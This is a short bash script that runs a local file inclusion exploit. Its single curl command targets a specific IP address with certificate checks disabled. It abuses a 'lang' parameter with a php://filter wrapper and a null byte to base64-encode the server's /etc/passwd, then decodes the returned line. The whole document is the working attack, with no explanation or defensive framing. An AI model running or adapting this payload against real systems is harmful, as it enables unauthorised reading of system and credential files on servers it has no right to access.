#!/bin/bash

curl -vk https://46.105.49.65/916eba03a2d2/?lang=php://filter/convert.base64-encode/resource=/etc/passwd%00 | head -n 1 | base64 -d
